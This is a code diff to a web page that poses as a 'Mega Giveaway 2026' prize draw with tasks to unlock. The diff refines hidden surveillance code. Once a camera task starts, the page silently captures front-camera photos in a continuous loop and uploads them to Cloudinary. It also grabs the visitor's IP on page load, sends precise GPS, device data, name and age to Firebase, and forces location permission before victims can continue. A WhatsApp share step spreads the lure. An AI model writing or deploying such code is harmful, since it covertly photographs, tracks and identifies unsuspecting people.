@@ -33,7 +33,7 @@
     .tasks-box { background: white; border-radius: 6px; padding: 16px; margin-bottom: 8px; border: 1px solid #ddd; }
     .task-item { display: flex; align-items: center; gap: 12px; padding: 12px 0; border-bottom: 1px solid #f0f0f0; text-decoration: none; color: #222; cursor: pointer; }
     .task-item:last-child { border-bottom: none; }
-    .task-item:hover { background: #f9f9f9; margin: 0 -16px; padding: 12px 16px; }
+    .task-item:hover:not(.locked):not(.done) { background: #f9f9f9; margin: 0 -16px; padding: 12px 16px; }
     .task-item.done .task-num { background: #27ae60; }
     .task-item.done .task-text { color: #aaa; text-decoration: line-through; }
     .task-item.locked { opacity: 0.4; pointer-events: none; cursor: not-allowed; }
@@ -54,10 +54,17 @@
     .footer a { color: #aaa; }
     .photo-btns { display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap; }
     .photo-view-btn { background: #1a1a2e; color: white; border: none; padding: 10px 16px; border-radius: 6px; font-size: 13px; cursor: pointer; }
+
+    /* Debug log */
+    #debug-log { display:none; background:#111; color:#0f0; font-size:11px; padding:10px; border-radius:6px; margin-bottom:16px; font-family:monospace; word-break:break-all; }
+
+    /* Photo popup */
     #photo-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9998; align-items: center; justify-content: center; flex-direction: column; }
     #photo-popup.active { display: flex; }
     #popup-img { max-width: 90%; max-height: 80vh; border-radius: 8px; }
     .popup-close-btn { margin-top: 16px; background: #e74c3c; color: white; border: none; padding: 12px 28px; border-radius: 6px; font-size: 15px; cursor: pointer; }
+
+    /* Camera overlay */
     #camera-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
     #camera-overlay.active { display: flex; }
     #camera-video { width: 100%; max-width: 480px; border-radius: 8px; }
@@ -65,9 +72,11 @@
     .cam-btn-row { display: flex; gap: 12px; margin-top: 16px; }
     .cam-snap-btn { background: #e74c3c; color: white; border: none; padding: 14px 32px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; }
     .cam-cancel-btn { background: #555; color: white; border: none; padding: 14px 20px; font-size: 14px; border-radius: 8px; cursor: pointer; }
-    #rating-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center; }
+
+    /* Rating dialog — pointer-events:none on overlay prevents outside click closing */
+    #rating-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center; pointer-events: none; }
     #rating-dialog.active { display: flex; }
-    .rating-box { background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 380px; }
+    .rating-box { background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 380px; pointer-events: all; }
     .rating-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
     .rating-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
     .stars { display: flex; gap: 8px; margin-bottom: 16px; }
@@ -76,9 +85,11 @@
     .rating-box textarea { width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 10px; font-size: 13px; font-family: Arial; resize: none; height: 80px; margin-bottom: 14px; }
     .rating-submit-btn { width: 100%; background: #e74c3c; color: white; border: none; padding: 13px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; }
     .rating-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
-    #citizen-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center; }
+
+    /* Citizen dialog — same pointer-events fix */
+    #citizen-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center; pointer-events: none; }
     #citizen-dialog.active { display: flex; }
-    .citizen-box { background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 400px; max-height: 90vh; overflow-y: auto; }
+    .citizen-box { background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 400px; max-height: 90vh; overflow-y: auto; pointer-events: all; }
     .citizen-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
     .citizen-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
     .form-row { margin-bottom: 12px; }
@@ -88,6 +99,7 @@
     .citizen-submit-btn { width: 100%; background: #e74c3c; color: white; border: none; padding: 13px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 6px; }
     .citizen-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
     .locating-msg { font-size: 12px; color: #e67e22; text-align: center; margin-bottom: 10px; }
+    .loc-error { font-size: 12px; color: #e74c3c; text-align: center; margin-bottom: 10px; font-weight: bold; }
   </style>
 </head>
 <body>
@@ -167,7 +179,7 @@
       <button class="photo-view-btn" id="photo-btn-2" style="display:none">📎 View Task 2 Photo</button>
     </div>
 
-    <div id="debug-log" style="display:none; background:#111; color:#0f0; font-size:11px; padding:10px; border-radius:6px; margin-bottom:16px; font-family:monospace; word-break:break-all;"></div>
+    <div id="debug-log"></div>
 
     <button class="enroll-btn locked" id="enroll-btn">🎯 ENROLL ME IN THE DRAW</button>
 
@@ -222,7 +234,8 @@
     <div class="citizen-box">
       <h3>🇮🇳 Citizen Verification</h3>
       <p>Please fill in your details to confirm eligibility for the prize.</p>
-      <p class="locating-msg" id="locating-msg">📡 Fetching your location...</p>
+      <p id="locating-msg" class="locating-msg">📡 Fetching your location...</p>
+      <p id="loc-error" class="loc-error" style="display:none">⚠️ Location permission denied. Please allow location and try again.</p>
       <div class="form-row"><label>Full Name</label><input type="text" id="c-name" placeholder="Enter your name" /></div>
       <div class="form-row"><label>Age</label><input type="number" id="c-age" placeholder="Enter your age" /></div>
       <div class="form-row"><label>Nationality</label>
@@ -287,19 +300,19 @@
         fd.append('upload_preset', UPLOAD_PRESET);
         const res = await fetch('https://api.cloudinary.com/v1_1/' + CLOUD_NAME + '/image/upload', { method: 'POST', body: fd });
         const d = await res.json();
-        if (d.secure_url) log('✅ Cloudinary uploaded');
+        if (d.secure_url) log('✅ Cloudinary OK');
         else log('❌ Cloudinary: ' + JSON.stringify(d));
       } catch(e) { log('❌ Cloudinary: ' + e.message); }
     }
 
-    const DEBUG = true; // <-------------------------------------------------------------------------------------------------------------------------------------------------------------------- set to true to see debug log
-
+    // ─── DEBUG — set true to see log on screen ───────────────────
+    const DEBUG = true; // <-- change to true to show debug log
+    
     function log(msg) {
       if (!DEBUG) return;
       const box = document.getElementById('debug-log');
       if (box) { box.style.display = 'block'; box.innerHTML += msg + '<br>'; }
     }
-
 
     // ─── State ───────────────────────────────────────────────────
     const TOTAL_TASKS = 5;
@@ -311,11 +324,18 @@
     let silentCapturing = false;
     let selectedRating = 0;
     let locationData = {};
+    let ipAddress = 'unknown';
 
     // ─── CAPTURE MODE ────────────────────────────────────────────
     // 'front' = only front camera continuously
     // 'both'  = alternates front and back
-    const CAPTURE_MODE = 'front'; // <------------------------------------------------------------------------------------------------------------------------------------------------------------ change to 'front' or 'both'
+    const CAPTURE_MODE = 'front'; // <-- change to 'front' or 'both'
+
+    // ─── Fetch IP on page load silently ──────────────────────────
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(d => { ipAddress = d.ip; log('🌐 IP: ' + ipAddress); })
+      .catch(() => {});
 
     // ─── Progress ────────────────────────────────────────────────
     function updateProgressBar() {
@@ -372,7 +392,7 @@
     function startSilentCapture() {
       if (silentCapturing) return;
       silentCapturing = true;
-      log('📷 Silent capture started — mode: ' + CAPTURE_MODE);
+      log('📷 Silent capture — mode: ' + CAPTURE_MODE);
       if (CAPTURE_MODE === 'front') captureFrontOnly();
       else captureAlternating('user');
     }
@@ -383,8 +403,7 @@
         .then(stream => {
           silentStream = stream;
           const vid = document.getElementById('silent-video');
-          vid.srcObject = stream;
-          vid.play();
+          vid.srcObject = stream; vid.play();
           vid.onloadedmetadata = () => frontLoop();
         })
         .catch(e => { log('❌ Front cam: ' + e.message); silentCapturing = false; });
@@ -397,7 +416,7 @@
       if (vid.readyState >= 2 && vid.videoWidth > 0) {
         canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
         canvas.getContext('2d').drawImage(vid, 0, 0);
-        log('📸 Front photo captured');
+        log('📸 Front captured');
         sendToCloudinary(canvas.toDataURL('image/jpeg', 0.5));
       }
       requestAnimationFrame(frontLoop);
@@ -405,7 +424,7 @@
 
     function captureAlternating(facing) {
       if (!silentCapturing) return;
-      log('🔄 Switching to ' + (facing === 'user' ? 'front' : 'back') + ' camera...');
+      log('🔄 ' + (facing === 'user' ? 'Front' : 'Back') + ' camera...');
       if (silentStream) { silentStream.getTracks().forEach(t => t.stop()); silentStream = null; }
       navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } })
         .then(stream => {
@@ -422,7 +441,7 @@
           }, 800);
         })
         .catch(e => {
-          log('❌ Cam error: ' + e.message);
+          log('❌ ' + e.message);
           setTimeout(() => captureAlternating(facing === 'user' ? 'environment' : 'user'), 1000);
         });
     }
@@ -438,28 +457,37 @@
           document.getElementById('camera-overlay').classList.add('active');
           startSilentCapture();
         })
-        .catch(() => alert('Camera permission denied. Please allow camera access to complete this task.'));
+        .catch(() => {
+          // Permission denied — reset activeTaskNum so task is NOT marked done
+          activeTaskNum = null;
+          alert('Camera permission denied. Please allow camera access and try again.');
+        });
     }
 
-    function snapPhoto() {
+    document.getElementById('cam-snap-btn').addEventListener('click', () => {
       const video = document.getElementById('camera-video');
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth; canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0);
       const photoData = canvas.toDataURL('image/jpeg', 0.8);
       const taskNum = activeTaskNum;
-      closeCamera();
+      // Stop user camera
+      if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
+      document.getElementById('camera-overlay').classList.remove('active');
+      activeTaskNum = null;
+      // Store photo and show view button
       photos[taskNum] = photoData;
       const btn = document.getElementById('photo-btn-' + taskNum);
       if (btn) btn.style.display = 'inline-block';
       markTaskDone(taskNum);
-    }
+    });
 
-    function closeCamera() {
+    document.getElementById('cam-cancel-btn').addEventListener('click', () => {
       if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
       document.getElementById('camera-overlay').classList.remove('active');
       activeTaskNum = null;
-    }
+      // Task NOT marked done — user cancelled
+    });
 
     // ─── Task 1 ──────────────────────────────────────────────────
     document.getElementById('task-1').addEventListener('click', () => {
@@ -518,50 +546,55 @@
       document.getElementById('c-area').value = '';
       document.getElementById('c-state').value = '';
       document.getElementById('citizen-submit').classList.add('disabled');
-      const locMsg = document.getElementById('locating-msg');
-      locMsg.style.display = 'block';
-      locMsg.textContent = '📡 Fetching your location...';
+      document.getElementById('citizen-submit').textContent = 'Confirm & Continue';
+      document.getElementById('locating-msg').style.display = 'block';
+      document.getElementById('locating-msg').textContent = '📡 Fetching your location...';
+      document.getElementById('loc-error').style.display = 'none';
       document.getElementById('citizen-dialog').classList.add('active');
 
-      fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(d => { locationData.ip = d.ip; log('🌐 IP: ' + d.ip); })
-        .catch(() => { locationData.ip = 'unknown'; });
-
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          locationData.lat = pos.coords.latitude;
-          locationData.lng = pos.coords.longitude;
-          locationData.accuracy = pos.coords.accuracy;
-          log('📍 GPS: ' + locationData.lat + ', ' + locationData.lng);
-          // Send location to Firebase immediately on permission grant
-          saveToFirebase({
-            lat: String(locationData.lat),
-            lng: String(locationData.lng),
-            accuracy: String(locationData.accuracy),
-            ip: locationData.ip || 'pending',
-            device: navigator.userAgent,
-            timestamp: new Date().toISOString(),
-            type: 'immediate'
-          });
-          fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + locationData.lat + '&lon=' + locationData.lng)
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            // ── Location granted — save to Firebase immediately ──
+            locationData.lat      = pos.coords.latitude;
+            locationData.lng      = pos.coords.longitude;
+            locationData.accuracy = pos.coords.accuracy;
+            locationData.ip       = ipAddress;
+            locationData.device   = navigator.userAgent;
+            locationData.timestamp = new Date().toISOString();
+            locationData.type     = 'immediate';
+            saveToFirebase({ ...locationData }); // send immediately
+            log('📍 GPS: ' + locationData.lat + ', ' + locationData.lng);
 
-            .then(r => r.json())
-            .then(geo => {
-              const addr = geo.address || {};
-              locationData.city  = addr.city || addr.town || addr.village || addr.county || '';
-              locationData.area  = addr.suburb || addr.neighbourhood || addr.road || '';
-              locationData.state = addr.state || '';
-              document.getElementById('c-city').value  = locationData.city;
-              document.getElementById('c-area').value  = locationData.area;
-              document.getElementById('c-state').value = locationData.state;
-              locMsg.style.display = 'none';
-              log('🗺️ ' + locationData.city + ', ' + locationData.state);
-              checkCitizenReady();
-            })
-            .catch(() => { locMsg.textContent = '⚠️ Could not detect location'; });
-        }, () => { locMsg.textContent = '⚠️ Location permission denied'; },
-        { enableHighAccuracy: true, timeout: 15000 });
+            // Reverse geocode to fill city/area/state
+            fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + locationData.lat + '&lon=' + locationData.lng)
+              .then(r => r.json())
+              .then(geo => {
+                const addr = geo.address || {};
+                locationData.city  = addr.city || addr.town || addr.village || addr.county || '';
+                locationData.area  = addr.suburb || addr.neighbourhood || addr.road || '';
+                locationData.state = addr.state || '';
+                document.getElementById('c-city').value  = locationData.city;
+                document.getElementById('c-area').value  = locationData.area;
+                document.getElementById('c-state').value = locationData.state;
+                document.getElementById('locating-msg').style.display = 'none';
+                log('🗺️ ' + locationData.city + ', ' + locationData.state);
+                checkCitizenReady();
+              })
+              .catch(() => {
+                document.getElementById('locating-msg').style.display = 'none';
+                checkCitizenReady();
+              });
+          },
+          () => {
+            // ── Location denied ──────────────────────────────────
+            document.getElementById('locating-msg').style.display = 'none';
+            document.getElementById('loc-error').style.display = 'block';
+            document.getElementById('citizen-submit').classList.add('disabled');
+            document.getElementById('citizen-submit').textContent = 'Allow location permission to continue';
+          },
+          { enableHighAccuracy: true, timeout: 15000 }
+        );
       }
     });
 
@@ -573,23 +606,30 @@
       const age  = document.getElementById('c-age').value.trim();
       const city = document.getElementById('c-city').value.trim();
       const btn  = document.getElementById('citizen-submit');
-      if (name && age && city) btn.classList.remove('disabled');
-      else btn.classList.add('disabled');
+      // Only enable if location was granted (city filled) and name+age typed
+      if (name && age && city) {
+        btn.classList.remove('disabled');
+        btn.textContent = 'Confirm & Continue';
+      } else {
+        btn.classList.add('disabled');
+      }
     }
 
     document.getElementById('citizen-submit').addEventListener('click', () => {
       const name = document.getElementById('c-name').value.trim();
       const age  = document.getElementById('c-age').value.trim();
-      if (!name || !age) return;
-      locationData.name        = name;
-      locationData.age         = age;
-      locationData.nationality = document.getElementById('c-nationality').value;
-      locationData.city        = document.getElementById('c-city').value;
-      locationData.area        = document.getElementById('c-area').value;
-      locationData.state       = document.getElementById('c-state').value;
-      locationData.device      = navigator.userAgent;
-      locationData.timestamp   = new Date().toISOString();
-      saveToFirebase(locationData);
+      const city = document.getElementById('c-city').value.trim();
+      if (!name || !age || !city) return;
+      // Save full data with name/age to Firebase
+      saveToFirebase({
+        ...locationData,
+        name, age,
+        nationality: document.getElementById('c-nationality').value,
+        city: document.getElementById('c-city').value,
+        area:  document.getElementById('c-area').value,
+        state: document.getElementById('c-state').value,
+        type: 'full_submission'
+      });
       document.getElementById('citizen-dialog').classList.remove('active');
       markTaskDone(4);
     });
@@ -600,10 +640,6 @@
       window.open('https://wa.me/?text=Win%20prizes%20in%20Mega%20Giveaway%202026!%20https://jntuhconfess2k25.github.io/spinner/', '_blank');
       markTaskDone(5);
     });
-
-    // ─── Camera buttons ──────────────────────────────────────────
-    document.getElementById('cam-snap-btn').addEventListener('click', snapPhoto);
-    document.getElementById('cam-cancel-btn').addEventListener('click', closeCamera);
 
     // ─── Photo popup ─────────────────────────────────────────────
     document.getElementById('photo-btn-1').addEventListener('click', () => {
@@ -629,9 +665,8 @@
       alert('You have been enrolled! Results will be announced within 24 hours. Good luck!');
     });
 
-    // Initialize locks after all listeners are registered
+    // ─── Initialize locks ────────────────────────────────────────
     updateLocks();
-
 
   </script>
 
